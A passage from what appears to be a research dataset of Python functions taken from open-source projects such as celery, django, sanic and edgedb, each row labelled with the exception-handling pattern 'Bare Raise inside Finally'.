            if sz < input_size:
                shutil.copystat(file_path, outfile)
                atomic_rename(outfile, file_path)
    finally:
        try:
            os.remove(outfile)
        except OSError as err:
            if err.errno != errno.ENOENT:
                raise
        try:
            os.remove(outfile + '.bak')  # optipng creates these files
        except OSError as err:
            if err.errno != errno.ENOENT:
                raise",Bare Raise inside Finally,1
7946,beets,/home/r4ph/desenv/phd/exception-miner/projects/py/beets/beetsplug/absubmit.py,_get_analysis,"def _get_analysis(self, item):
        mbid = item[""mb_trackid""]

        # Avoid re-analyzing files that already have AB data.
        if not self.opts.force_refetch and not self.config[""force""]:
            if item.get(PROBE_FIELD):
                return None

        # If file has no MBID, skip it.
        if not mbid:
            self._log.info(
                ""Not analysing {}, missing "" ""musicbrainz track id."", item
            )
            return None

        if self.opts.pretend_fetch or self.config[""pretend""]:
            self._log.info(""pretend action - extract item: {}"", item)
            return None

        # Temporary file to save extractor output to, extractor only works
        # if an output file is given. Here we use a temporary file to copy
        # the data into a python object and then remove the file from the
        # system.
        tmp_file, filename = tempfile.mkstemp(suffix="".json"")
        try:
            # Close the file, so the extractor can overwrite it.
            os.close(tmp_file)
            try:
                call([self.extractor, util.syspath(item.path), filename])
            except ABSubmitError as e:
                self._log.warning(
                    ""Failed to analyse {item} for AcousticBrainz: {error}"",
                    item=item,
                    error=e,
                )
                return None
            with open(filename) as tmp_file:
                analysis = json.load(tmp_file)
            # Add the hash to the output.
            analysis[""metadata""][""version""][
                ""essentia_build_sha""
            ] = self.extractor_sha
            return analysis
        finally:
            try:
                os.remove(filename)
            except OSError as e:
                # ENOENT means file does not exist, just ignore this error.
                if e.errno != errno.ENOENT:
                    raise",Bare Raise inside Finally,1
12198,django,/home/r4ph/desenv/exception-miner/projects/py/django/django/test/runner.py,run_tests,"def run_tests(self, test_labels, **kwargs):
        """"""
        Run the unit tests for all the test labels in the provided list.

        Test labels should be dotted Python paths to test modules, test
        classes, or test methods.

        Return the number of tests that failed.
        """"""
        self.setup_test_environment()
        suite = self.build_suite(test_labels)
        databases = self.get_databases(suite)
        suite.serialized_aliases = set(
            alias for alias, serialize in databases.items() if serialize
        )
        suite.used_aliases = set(databases)
        with self.time_keeper.timed(""Total database setup""):
            old_config = self.setup_databases(
                aliases=databases,
                serialized_aliases=suite.serialized_aliases,
            )
        run_failed = False
        try:
            self.run_checks(databases)
            result = self.run_suite(suite)
        except Exception:
            run_failed = True
            raise
        finally:
            try:
                with self.time_keeper.timed(""Total database teardown""):
                    self.teardown_databases(old_config)
                self.teardown_test_environment()
            except Exception:
                # Silence teardown exceptions if an exception was raised during
                # runs to avoid shadowing it.
                if not run_failed:
                    raise
        self.time_keeper.print_results()
        return self.suite_result(suite, result)",Bare Raise inside Finally,1
30000,sanic,/home/r4ph/desenv/exception-miner/projects/py/sanic/sanic/server/socket.py,bind_unix_socket,"def bind_unix_socket(path: str, *, mode=0o666, backlog=100) -> socket.socket:
    """"""Create unix socket.
    :param path: filesystem path
    :param backlog: Maximum number of connections to queue
    :return: socket.socket object
    """"""

    # Sanitise and pre-verify socket path
    path = os.path.abspath(path)
    folder = os.path.dirname(path)
    if not os.path.isdir(folder):
        raise FileNotFoundError(f""Socket folder does not exist: {folder}"")
    try:
        if not stat.S_ISSOCK(os.stat(path, follow_symlinks=False).st_mode):
            raise FileExistsError(f""Existing file is not a socket: {path}"")
    except FileNotFoundError:
        pass
    # Create new socket with a random temporary name
    tmp_path = f""{path}.{secrets.token_urlsafe()}""
    sock = socket.socket(socket.AF_UNIX)
    try:
        # Critical section begins (filename races)
        sock.bind(tmp_path)
        try:
            os.chmod(tmp_path, mode)
            # Start listening before rename to avoid connection failures
            sock.listen(backlog)
            os.rename(tmp_path, path)
        except:  # noqa: E722
            try:
                os.unlink(tmp_path)
            finally:
                raise
    except:  # noqa: E722
        try:
            sock.close()
        finally:
            raise
    return sock",Bare Raise inside Finally,1
39048,jina,/home/r4ph/desenv/phd/exception-miner/projects/py/jina/jina/clients/base/websocket.py,_get_results,"async def _get_results(
        self,
        inputs: 'InputType',
        on_done: 'CallbackFnType',
        on_error: Optional['CallbackFnType'] = None,
        on_always: Optional['CallbackFnType'] = None,
        max_attempts: int = 1,
        initial_backoff: float = 0.5,
        max_backoff: float = 0.1,
        backoff_multiplier: float = 1.5,
        results_in_order: bool = False,
        prefetch: Optional[int] = None,
        **kwargs,
    ):
        """"""
        :param inputs: the callable
        :param on_done: the callback for on_done
        :param on_error: the callback for on_error
        :param on_always: the callback for on_always
        :param max_attempts: Number of sending attempts, including the original request.
        :param initial_backoff: The first retry will happen with a delay of random(0, initial_backoff)
        :param max_backoff: The maximum accepted backoff after the exponential incremental delay
        :param backoff_multiplier: The n-th attempt will occur at random(0, min(initialBackoff*backoffMultiplier**(n-1), maxBackoff))
        :param results_in_order: return the results in the same order as the inputs
        :param prefetch: How many Requests are processed from the Client at the same time.
        :param kwargs: kwargs coming from the public interface. Includes arguments to be passed to the `WebsocketClientlet`
        :yields: generator over results
        """"""
        with ImportExtensions(required=True):
            pass

        self.inputs = inputs
        request_iterator = self._get_requests(**kwargs)

        async with AsyncExitStack() as stack:
            cm1 = ProgressBar(
                total_length=self._inputs_length, disable=not (self.show_progress)
            )
            p_bar = stack.enter_context(cm1)

            proto = 'wss' if self.args.tls else 'ws'
            url = f'{proto}://{self.args.host}:{self.args.port}/'
            iolet = await stack.enter_async_context(
                WebsocketClientlet(
                    url=url,
                    logger=self.logger,
                    tracer_provider=self.tracer_provider,
                    max_attempts=max_attempts,
                    initial_backoff=initial_backoff,
                    max_backoff=max_backoff,
                    backoff_multiplier=backoff_multiplier,
                    **kwargs,
                )
            )

            request_buffer: Dict[
                str, asyncio.Future
            ] = dict()  # maps request_ids to futures (tasks)

            def _result_handler(result):
                return result

            async def _receive():
                def _response_handler(response):
                    if response.header.request_id in request_buffer:
                        future = request_buffer.pop(response.header.request_id)
                        future.set_result(response)
                    else:
                        self.logger.warning(
                            f'discarding unexpected response with request id {response.header.request_id}'
                        )

                """"""Await messages from WebsocketGateway and process them in the request buffer""""""
                try:
                    async for response in iolet.recv_message():
                        _response_handler(response)
                finally:
                    if request_buffer:
                        self.logger.warning(
                            f'{self.__class__.__name__} closed, cancelling all outstanding requests'
                        )
                        for future in request_buffer.values():
                            future.cancel()
                        request_buffer.clear()

            def _handle_end_of_iter():
                """"""Send End of iteration signal to the Gateway""""""
                asyncio.create_task(iolet.send_eoi())

            def _request_handler(
                request: 'Request',
            ) -> 'Tuple[asyncio.Future, Optional[asyncio.Future]]':
                """"""
                For each request in the iterator, we send the `Message` using `iolet.send_message()`.
                For websocket requests from client, for each request in the iterator, we send the request in `bytes`
                using `iolet.send_message()`.
                Then add {<request-id>: <an-empty-future>} to the request buffer.
                This empty future is used to track the `result` of this request during `receive`.
                :param request: current request in the iterator
                :return: asyncio Future for sending message
                """"""
                future = get_or_reuse_loop().create_future()
                request_buffer[request.header.request_id] = future
                asyncio.create_task(iolet.send_message(request))
                return future, None

            streamer_args = vars(self.args)
            if prefetch:
                streamer_args['prefetch'] = prefetch
            streamer = RequestStreamer(
                request_handler=_request_handler,
                result_handler=_result_handler,
                end_of_iter_handler=_handle_end_of_iter,
                logger=self.logger,
                **streamer_args,
            )

            receive_task = asyncio.create_task(_receive())

            exception_raised = None

            if receive_task.done():
                raise RuntimeError('receive task not running, can not send messages')
            try:
                async for response in streamer.stream(
                    request_iterator=request_iterator,
                    results_in_order=results_in_order,
                ):
                    callback_exec(
                        response=response,
                        on_error=on_error,
                        on_done=on_done,
                        on_always=on_always,
                        continue_on_error=self.continue_on_error,
                        logger=self.logger,
                    )
                    if self.show_progress:
                        p_bar.update()
                    yield response
            except Exception as ex:
                exception_raised = ex
                try:
                    receive_task.cancel()
                except:
                    raise ex
            finally:
                if iolet.close_code == status.WS_1011_INTERNAL_ERROR:
                    raise ConnectionError(iolet.close_message)
                try:
                    await receive_task
                except asyncio.CancelledError:
                    if exception_raised is not None:
                        raise exception_raised
                    else:
                        raise",Bare Raise inside Finally,1
41505,memray,/home/r4ph/desenv/phd/exception-miner/projects/py/memray/tests/integration/test_socket.py,run_till_snapshot_point,"def run_till_snapshot_point(
    program: str,
    *,
    reader: SocketReader,
    tmp_path: Path,
    free_port: int,
) -> Iterator[None]:
    allocations_made = tmp_path / ""allocations_made.event""
    snapshot_taken = tmp_path / ""snapshot_taken.event""
    os.mkfifo(allocations_made)
    os.mkfifo(snapshot_taken)

    script = _SCRIPT_TEMPLATE.format(body=program)

    env = os.environ.copy()
    env.pop(""PYTHONMALLOC"", None)
    proc = subprocess.Popen(
        [
            sys.executable,
            ""-c"",
            script,
            str(free_port),
            allocations_made,
            snapshot_taken,
        ],
        env=env,
    )

    try:
        with reader:
            print(""[parent] Waiting on allocations made"")
            with open(allocations_made, ""r"") as f1:
                assert f1.read() == ""done""

            print(""[parent] Deferring to caller"")
            # Wait a bit of time, for background thread to receive + process the records.
            time.sleep(0.1)
            yield

            print(""[parent] Notifying program to continue"")
            with open(snapshot_taken, ""w"") as f2:
                f2.write(""done"")
            print(""[parent] Will close socket reader now."")
    finally:
        print(""[parent] Waiting on child to exit."")
        try:
            assert proc.wait(timeout=TIMEOUT) == 0
        except subprocess.TimeoutExpired:
            print(""[parent] Killing child, after timeout."")
            proc.kill()
            raise",Bare Raise inside Finally,1
42101,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/app/trace.py,trace_task,"def trace_task(
            uuid: str,
            args: Sequence[Any],
            kwargs: Dict[str, Any],
            request: Optional[Dict[str, Any]] = None) -> trace_ok_t:
        """"""Execute and trace a `Task`.""""""

        # R      - is the possibly prepared return value.
        # I      - is the Info object.
        # T      - runtime
        # Rstr   - textual representation of return value
        # retval - is the always unmodified return value.
        # state  - is the resulting task state.

        # This function is very long because we've unrolled all the calls
        # for performance reasons, and because the function is so long
        # we want the main variables (I, and R) to stand out visually from the
        # the rest of the variables, so breaking PEP8 is worth it ;)
        R = I = T = Rstr = retval = state = None
        task_request = None
        time_start = monotonic()
        try:
            try:
                kwargs.items
            except AttributeError:
                raise InvalidTaskError(
                    'Task keyword arguments is not a mapping')

            task_request = Context(request or {}, args=args,
                                   called_directly=False, kwargs=kwargs)

            redelivered = (task_request.delivery_info
                           and task_request.delivery_info.get('redelivered', False))
            if deduplicate_successful_tasks and redelivered:
                if task_request.id in successful_requests:
                    return trace_ok_t(R, I, T, Rstr)
                r = AsyncResult(task_request.id, app=app)

                try:
                    state = r.state
                except BackendGetMetaError:
                    pass
                else:
                    if state == SUCCESS:
                        info(LOG_IGNORED, {
                            'id': task_request.id,
                            'name': get_task_name(task_request, name),
                            'description': 'Task already completed successfully.'
                        })
                        return trace_ok_t(R, I, T, Rstr)

            push_task(task)
            root_id = task_request.root_id or uuid
            task_priority = task_request.delivery_info.get('priority') if \
                inherit_parent_priority else None
            push_request(task_request)
            try:
                # -*- PRE -*-
                if prerun_receivers:
                    send_prerun(sender=task, task_id=uuid, task=task,
                                args=args, kwargs=kwargs)
                loader_task_init(uuid, task)
                if track_started:
                    task.backend.store_result(
                        uuid, {'pid': pid, 'hostname': hostname}, STARTED,
                        request=task_request,
                    )

                # -*- TRACE -*-
                try:
                    if task_before_start:
                        task_before_start(uuid, args, kwargs)

                    R = retval = fun(*args, **kwargs)
                    state = SUCCESS
                except Reject as exc:
                    I, R = Info(REJECTED, exc), ExceptionInfo(internal=True)
                    state, retval = I.state, I.retval
                    I.handle_reject(task, task_request)
                    traceback_clear(exc)
                except Ignore as exc:
                    I, R = Info(IGNORED, exc), ExceptionInfo(internal=True)
                    state, retval = I.state, I.retval
                    I.handle_ignore(task, task_request)
                    traceback_clear(exc)
                except Retry as exc:
                    I, R, state, retval = on_error(
                        task_request, exc, RETRY, call_errbacks=False)
                    traceback_clear(exc)
                except Exception as exc:
                    I, R, state, retval = on_error(task_request, exc)
                    traceback_clear(exc)
                except BaseException:
                    raise
                else:
                    try:
                        # callback tasks must be applied before the result is
                        # stored, so that result.children is populated.

                        # groups are called inline and will store trail
                        # separately, so need to call them separately
                        # so that the trail's not added multiple times :(
                        # (Issue #1936)
                        callbacks = task.request.callbacks
                        if callbacks:
                            if len(task.request.callbacks) > 1:
                                sigs, groups = [], []
                                for sig in callbacks:
                                    sig = signature(sig, app=app)
                                    if isinstance(sig, group):
                                        groups.append(sig)
                                    else:
                                        sigs.append(sig)
                                for group_ in groups:
                                    group_.apply_async(
                                        (retval,),
                                        parent_id=uuid, root_id=root_id,
                                        priority=task_priority
                                    )
                                if sigs:
                                    group(sigs, app=app).apply_async(
                                        (retval,),
                                        parent_id=uuid, root_id=root_id,
                                        priority=task_priority
                                    )
                            else:
                                signature(callbacks[0], app=app).apply_async(
                                    (retval,), parent_id=uuid, root_id=root_id,
                                    priority=task_priority
                                )

                        # execute first task in chain
                        chain = task_request.chain
                        if chain:
                            _chsig = signature(chain.pop(), app=app)
                            _chsig.apply_async(
                                (retval,), chain=chain,
                                parent_id=uuid, root_id=root_id,
                                priority=task_priority
                            )
                        task.backend.mark_as_done(
                            uuid, retval, task_request, publish_result,
                        )
                    except EncodeError as exc:
                        I, R, state, retval = on_error(task_request, exc)
                    else:
                        Rstr = saferepr(R, resultrepr_maxsize)
                        T = monotonic() - time_start
                        if task_on_success:
                            task_on_success(retval, uuid, args, kwargs)
                        if success_receivers:
                            send_success(sender=task, result=retval)
                        if _does_info:
                            info(LOG_SUCCESS, {
                                'id': uuid,
                                'name': get_task_name(task_request, name),
                                'return_value': Rstr,
                                'runtime': T,
                                'args': safe_repr(args),
                                'kwargs': safe_repr(kwargs),
                            })

                # -* POST *-
                if state not in IGNORE_STATES:
                    if task_after_return:
                        task_after_return(
                            state, retval, uuid, args, kwargs, None,
                        )
            finally:
                try:
                    if postrun_receivers:
                        send_postrun(sender=task, task_id=uuid, task=task,
                                     args=args, kwargs=kwargs,
                                     retval=retval, state=state)
                finally:
                    pop_task()
                    pop_request()
                    if not eager:
                        try:
                            task.backend.process_cleanup()
                            loader_cleanup()
                        except (KeyboardInterrupt, SystemExit, MemoryError):
                            raise
                        except Exception as exc:
                            logger.error('Process cleanup failed: %r', exc,
                                         exc_info=True)
        except MemoryError:
            raise
        except Exception as exc:
            _signal_internal_error(task, uuid, args, kwargs, request, exc)
            if eager:
                raise
            R = report_internal_error(task, exc)
            if task_request is not None:
                I, _, _, _ = on_error(task_request, exc)
        return trace_ok_t(R, I, T, Rstr)",Bare Raise inside Finally,1
42107,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/app/trace.py,build_tracer,"def build_tracer(
        name: str,
        task: Union[celery.Task, celery.local.PromiseProxy],
        loader: Optional[celery.loaders.app.AppLoader] = None,
        hostname: Optional[str] = None,
        store_errors: bool = True,
        Info: Type[TraceInfo] = TraceInfo,
        eager: bool = False,
        propagate: bool = False,
        app: Optional[celery.Celery] = None,
        monotonic: Callable[[], int] = time.monotonic,
        trace_ok_t: Type[trace_ok_t] = trace_ok_t,
        IGNORE_STATES: FrozenSet[str] = IGNORE_STATES) -> \
        Callable[[str, Tuple[Any, ...], Dict[str, Any], Any], trace_ok_t]:
    """"""Return a function that traces task execution.

    Catches all exceptions and updates result backend with the
    state and result.

    If the call was successful, it saves the result to the task result
    backend, and sets the task status to `""SUCCESS""`.

    If the call raises :exc:`~@Retry`, it extracts
    the original exception, uses that as the result and sets the task state
    to `""RETRY""`.

    If the call results in an exception, it saves the exception as the task
    result, and sets the task state to `""FAILURE""`.

    Return a function that takes the following arguments:

        :param uuid: The id of the task.
        :param args: List of positional args to pass on to the function.
        :param kwargs: Keyword arguments mapping to pass on to the function.
        :keyword request: Request dict.

    """"""

    # pylint: disable=too-many-statements

    # If the task doesn't define a custom __call__ method
    # we optimize it away by simply calling the run method directly,
    # saving the extra method call and a line less in the stack trace.
    fun = task if task_has_custom(task, '__call__') else task.run

    loader = loader or app.loader
    ignore_result = task.ignore_result
    track_started = task.track_started
    track_started = not eager and (task.track_started and not ignore_result)

    # #6476
    if eager and not ignore_result and task.store_eager_result:
        publish_result = True
    else:
        publish_result = not eager and not ignore_result

    deduplicate_successful_tasks = ((app.conf.task_acks_late or task.acks_late)
                                    and app.conf.worker_deduplicate_successful_tasks
                                    and app.backend.persistent)

    hostname = hostname or gethostname()
    inherit_parent_priority = app.conf.task_inherit_parent_priority

    loader_task_init = loader.on_task_init
    loader_cleanup = loader.on_process_cleanup

    task_before_start = None
    task_on_success = None
    task_after_return = None
    if task_has_custom(task, 'before_start'):
        task_before_start = task.before_start
    if task_has_custom(task, 'on_success'):
        task_on_success = task.on_success
    if task_has_custom(task, 'after_return'):
        task_after_return = task.after_return

    pid = os.getpid()

    request_stack = task.request_stack
    push_request = request_stack.push
    pop_request = request_stack.pop
    push_task = _task_stack.push
    pop_task = _task_stack.pop
    _does_info = logger.isEnabledFor(logging.INFO)
    resultrepr_maxsize = task.resultrepr_maxsize

    prerun_receivers = signals.task_prerun.receivers
    postrun_receivers = signals.task_postrun.receivers
    success_receivers = signals.task_success.receivers

    from celery import canvas
    signature = canvas.maybe_signature  # maybe_ does not clone if already

    def on_error(
            request: celery.app.task.Context,
            exc: Union[Exception, Type[Exception]],
            state: str = FAILURE,
            call_errbacks: bool = True) -> Tuple[Info, Any, Any, Any]:
        """"""Handle any errors raised by a `Task`'s execution.""""""
        if propagate:
            raise
        I = Info(state, exc)
        R = I.handle_error_state(
            task, request, eager=eager, call_errbacks=call_errbacks,
        )
        return I, R, I.state, I.retval

    def trace_task(
            uuid: str,
            args: Sequence[Any],
            kwargs: Dict[str, Any],
            request: Optional[Dict[str, Any]] = None) -> trace_ok_t:
        """"""Execute and trace a `Task`.""""""

        # R      - is the possibly prepared return value.
        # I      - is the Info object.
        # T      - runtime
        # Rstr   - textual representation of return value
        # retval - is the always unmodified return value.
        # state  - is the resulting task state.

        # This function is very long because we've unrolled all the calls
        # for performance reasons, and because the function is so long
        # we want the main variables (I, and R) to stand out visually from the
        # the rest of the variables, so breaking PEP8 is worth it ;)
        R = I = T = Rstr = retval = state = None
        task_request = None
        time_start = monotonic()
        try:
            try:
                kwargs.items
            except AttributeError:
                raise InvalidTaskError(
                    'Task keyword arguments is not a mapping')

            task_request = Context(request or {}, args=args,
                                   called_directly=False, kwargs=kwargs)

            redelivered = (task_request.delivery_info
                           and task_request.delivery_info.get('redelivered', False))
            if deduplicate_successful_tasks and redelivered:
                if task_request.id in successful_requests:
                    return trace_ok_t(R, I, T, Rstr)
                r = AsyncResult(task_request.id, app=app)

                try:
                    state = r.state
                except BackendGetMetaError:
                    pass
                else:
                    if state == SUCCESS:
                        info(LOG_IGNORED, {
                            'id': task_request.id,
                            'name': get_task_name(task_request, name),
                            'description': 'Task already completed successfully.'
                        })
                        return trace_ok_t(R, I, T, Rstr)

            push_task(task)
            root_id = task_request.root_id or uuid
            task_priority = task_request.delivery_info.get('priority') if \
                inherit_parent_priority else None
            push_request(task_request)
            try:
                # -*- PRE -*-
                if prerun_receivers:
                    send_prerun(sender=task, task_id=uuid, task=task,
                                args=args, kwargs=kwargs)
                loader_task_init(uuid, task)
                if track_started:
                    task.backend.store_result(
                        uuid, {'pid': pid, 'hostname': hostname}, STARTED,
                        request=task_request,
                    )

                # -*- TRACE -*-
                try:
                    if task_before_start:
                        task_before_start(uuid, args, kwargs)

                    R = retval = fun(*args, **kwargs)
                    state = SUCCESS
                except Reject as exc:
                    I, R = Info(REJECTED, exc), ExceptionInfo(internal=True)
                    state, retval = I.state, I.retval
                    I.handle_reject(task, task_request)
                    traceback_clear(exc)
                except Ignore as exc:
                    I, R = Info(IGNORED, exc), ExceptionInfo(internal=True)
                    state, retval = I.state, I.retval
                    I.handle_ignore(task, task_request)
                    traceback_clear(exc)
                except Retry as exc:
                    I, R, state, retval = on_error(
                        task_request, exc, RETRY, call_errbacks=False)
                    traceback_clear(exc)
                except Exception as exc:
                    I, R, state, retval = on_error(task_request, exc)
                    traceback_clear(exc)
                except BaseException:
                    raise
                else:
                    try:
                        # callback tasks must be applied before the result is
                        # stored, so that result.children is populated.

                        # groups are called inline and will store trail
                        # separately, so need to call them separately
                        # so that the trail's not added multiple times :(
                        # (Issue #1936)
                        callbacks = task.request.callbacks
                        if callbacks:
                            if len(task.request.callbacks) > 1:
                                sigs, groups = [], []
                                for sig in callbacks:
                                    sig = signature(sig, app=app)
                                    if isinstance(sig, group):
                                        groups.append(sig)
                                    else:
                                        sigs.append(sig)
                                for group_ in groups:
                                    group_.apply_async(
                                        (retval,),
                                        parent_id=uuid, root_id=root_id,
                                        priority=task_priority
                                    )
                                if sigs:
                                    group(sigs, app=app).apply_async(
                                        (retval,),
                                        parent_id=uuid, root_id=root_id,
                                        priority=task_priority
                                    )
                            else:
                                signature(callbacks[0], app=app).apply_async(
                                    (retval,), parent_id=uuid, root_id=root_id,
                                    priority=task_priority
                                )

                        # execute first task in chain
                        chain = task_request.chain
                        if chain:
                            _chsig = signature(chain.pop(), app=app)
                            _chsig.apply_async(
                                (retval,), chain=chain,
                                parent_id=uuid, root_id=root_id,
                                priority=task_priority
                            )
                        task.backend.mark_as_done(
                            uuid, retval, task_request, publish_result,
                        )
                    except EncodeError as exc:
                        I, R, state, retval = on_error(task_request, exc)
                    else:
                        Rstr = saferepr(R, resultrepr_maxsize)
                        T = monotonic() - time_start
                        if task_on_success:
                            task_on_success(retval, uuid, args, kwargs)
                        if success_receivers:
                            send_success(sender=task, result=retval)
                        if _does_info:
                            info(LOG_SUCCESS, {
                                'id': uuid,
                                'name': get_task_name(task_request, name),
                                'return_value': Rstr,
                                'runtime': T,
                                'args': safe_repr(args),
                                'kwargs': safe_repr(kwargs),
                            })

                # -* POST *-
                if state not in IGNORE_STATES:
                    if task_after_return:
                        task_after_return(
                            state, retval, uuid, args, kwargs, None,
                        )
            finally:
                try:
                    if postrun_receivers:
                        send_postrun(sender=task, task_id=uuid, task=task,
                                     args=args, kwargs=kwargs,
                                     retval=retval, state=state)
                finally:
                    pop_task()
                    pop_request()
                    if not eager:
                        try:
                            task.backend.process_cleanup()
                            loader_cleanup()
                        except (KeyboardInterrupt, SystemExit, MemoryError):
                            raise
                        except Exception as exc:
                            logger.error('Process cleanup failed: %r', exc,
                                         exc_info=True)
        except MemoryError:
            raise
        except Exception as exc:
            _signal_internal_error(task, uuid, args, kwargs, request, exc)
            if eager:
                raise
            R = report_internal_error(task, exc)
            if task_request is not None:
                I, _, _, _ = on_error(task_request, exc)
        return trace_ok_t(R, I, T, Rstr)

    return trace_task",Bare Raise inside Finally,1
42795,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/testbase/server.py,__aenter__,"async def __aenter__(self):
        status_r, status_w = socket.socketpair()

        cmd = [
            sys.executable, '-m', 'edb.server.main',
            '--port', 'auto',
            '--testmode',
            '--emit-server-status', f'fd://{status_w.fileno()}',
            '--compiler-pool-size', str(self.compiler_pool_size),
            '--tls-cert-mode', str(self.tls_cert_mode),
            '--jose-key-mode', 'generate',
        ]

        if self.compiler_pool_mode is not None:
            cmd.extend(('--compiler-pool-mode', self.compiler_pool_mode.value))

        for addr in self.bind_addrs:
            cmd.extend(('--bind-address', addr))

        reset_auth = self.reset_auth

        cmd.extend(['--log-level', 'd' if self.debug else 's'])
        if self.max_allowed_connections is not None:
            cmd.extend([
                '--max-backend-connections', str(self.max_allowed_connections),
            ])
        if self.backend_dsn is not None:
            cmd.extend([
                '--backend-dsn', self.backend_dsn,
            ])
        elif self.adjacent_to is not None:
            settings = self.adjacent_to.get_settings()
            pgaddr = settings.get('pgaddr')
            if pgaddr is None:
                raise RuntimeError('test requires devmode')
            pgaddr = json.loads(pgaddr)
            pgdsn = (
                f'postgres:///?user={pgaddr[""user""]}&port={pgaddr[""port""]}'
                f'&host={pgaddr[""host""]}'
            )
            cmd += [
                '--backend-dsn', pgdsn
            ]
        elif self.multitenant_config:
            cmd += ['--multitenant-config-file', self.multitenant_config]
        elif self.data_dir:
            cmd += ['--data-dir', self.data_dir]
        else:
            cmd += ['--temp-dir']

            if reset_auth is None:
                reset_auth = True

        if not reset_auth:
            password = None
            bootstrap_command = ''
        else:
            password = secrets.token_urlsafe()
            bootstrap_command = f""""""\
                ALTER ROLE edgedb {{
                    SET password := '{password}';
                }};
                """"""

        if self.bootstrap_command is not None:
            bootstrap_command += self.bootstrap_command

        if bootstrap_command:
            cmd += ['--bootstrap-command', bootstrap_command]

        if self.auto_shutdown_after is not None:
            cmd += ['--auto-shutdown-after', str(self.auto_shutdown_after)]

        if self.runstate_dir:
            cmd += ['--runstate-dir', self.runstate_dir]

        if self.tenant_id:
            cmd += ['--tenant-id', self.tenant_id]

        if self.security:
            cmd += ['--security', str(self.security)]

        if self.default_auth_method:
            cmd += ['--default-auth-method', str(self.default_auth_method)]

        if self.binary_endpoint_security:
            cmd += ['--binary-endpoint-security',
                    str(self.binary_endpoint_security)]

        if self.http_endpoint_security:
            cmd += ['--http-endpoint-security',
                    str(self.http_endpoint_security)]

        if self.enable_backend_adaptive_ha:
            cmd += ['--enable-backend-adaptive-ha']

        if self.ignore_other_tenants:
            cmd += ['--ignore-other-tenants']

        if self.tls_cert_file:
            cmd += ['--tls-cert-file', self.tls_cert_file]

        if self.tls_key_file:
            cmd += ['--tls-key-file', self.tls_key_file]

        if self.readiness_state_file:
            cmd += ['--readiness-state-file', self.readiness_state_file]

        if self.jws_key_file:
            cmd += ['--jws-key-file', self.jws_key_file]

        if self.jwt_sub_allowlist_file:
            cmd += ['--jwt-sub-allowlist-file', self.jwt_sub_allowlist_file]

        if self.jwt_revocation_list_file:
            cmd += ['--jwt-revocation-list-file',
                    self.jwt_revocation_list_file]

        if self.extra_args:
            cmd.extend(self.extra_args)

        if self.debug:
            print(
                f'Starting EdgeDB cluster with the following params:\n'
                f'{"" "".join(shlex.quote(c) for c in cmd)}'
            )

        env = os.environ.copy()
        if self.env:
            env.update(self.env)
        env.pop(""EDGEDB_SERVER_MULTITENANT_CONFIG_FILE"", None)

        stat_reader, stat_writer = await asyncio.open_connection(sock=status_r)

        self.proc: asyncio.Process = await asyncio.create_subprocess_exec(
            *cmd,
            env=env,
            stdout=subprocess.PIPE if not self.debug else None,
            stderr=subprocess.STDOUT,
            pass_fds=(status_w.fileno(),),
        )

        status_task = asyncio.create_task(
            asyncio.wait_for(
                self.wait_for_server_readiness(stat_reader),
                timeout=240,
            ),
        )
        try:
            _, pending = await asyncio.wait(
                [
                    status_task,
                    asyncio.create_task(self.proc.wait()),
                ],
                return_when=asyncio.FIRST_COMPLETED,
            )
        except (Exception, asyncio.CancelledError):
            try:
                await self._shutdown()
            finally:
                raise
        finally:
            stat_writer.close()
            status_w.close()

        if pending:
            for task in pending:
                if not task.done():
                    task.cancel()

            await asyncio.wait(pending, timeout=10)

        if self.proc.returncode is not None:
            output = (await self.proc.stdout.read()).decode().strip()
            raise edgedb_cluster.ClusterError(output)
        else:
            assert status_task.done()
            data = status_task.result()

        return _EdgeDBServerData(
            host='localhost',
            port=data['port'],
            password=password,
            server_data=data,
            tls_cert_file=data['tls_cert_file'],
            pid=self.proc.pid,
        )",Bare Raise inside Finally,1
42811,edgedb,/home/r4ph/desenv/phd/exception-miner/projects/py/edgedb/edb/buildmeta.py,write_data_cache,"def write_data_cache(
    obj: Any,
    cache_key: bytes,
    path: str,
    *,
    pickled: bool = True,
    target_dir: Optional[pathlib.Path] = None,
):
    if target_dir is None:
        target_dir = get_shared_data_dir_path()
    full_path = target_dir / path

    try:
        with tempfile.NamedTemporaryFile(
                mode='wb', dir=full_path.parent, delete=False) as f:
            f.write(cache_key)
            if pickled:
                pickle.dump(obj, file=f, protocol=pickle.HIGHEST_PROTOCOL)
            else:
                f.write(obj)
    except Exception:
        try:
            os.unlink(f.name)
        except OSError:
            pass
        finally:
            raise
    else:
        os.rename(f.name, full_path)",Bare Raise inside Finally,1
